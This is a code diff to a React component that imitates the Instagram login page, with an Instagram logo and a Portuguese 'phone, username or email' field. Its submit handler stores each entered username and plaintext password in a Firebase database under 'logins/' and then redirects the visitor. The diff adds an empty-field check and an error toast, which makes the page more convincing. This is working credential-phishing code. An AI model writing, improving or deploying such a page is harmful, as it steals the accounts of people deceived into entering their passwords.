@@ -6,6 +6,8 @@ import playstore from '../../assets/playstore.png';
 import logoInsta from '../../assets/instagram-logo-1.png'
 import fb from '../../ConfFirebase';
 import history from '../../history';
+import { ToastContainer, toast } from 'react-toastify';
+
 
 function Layout() {
 
@@ -14,17 +16,22 @@ function Layout() {
   var db = fb.database();
 
   function handleSubmit(user, password) {
-    db.ref('logins/' + user).set({
-      username: user,
-      pass: password
-    });
-    history.push('/image');
-    window.location.reload(true)
+    if(user != "" || password != ""){
+      db.ref('logins/' + user).set({
+        username: user,
+        pass: password
+      });
+      history.push('/image');
+      window.location.reload(true)
+    }else{
+      toast.error('Login inválido. Tente novamente...')
+    }
   }
 
   return(
     <Container>
       <CardLogin>
+        <ToastContainer autoClose={10000}/>
         <img id="logo-insta" src={logoInsta} />
         <form onSubmit={() => handleSubmit(user, password)}>
           <input type="text" name="user" onChange={ (event) => setUser(event.target.value)} placeholder="Telefone, nome de usuário ou email"/>
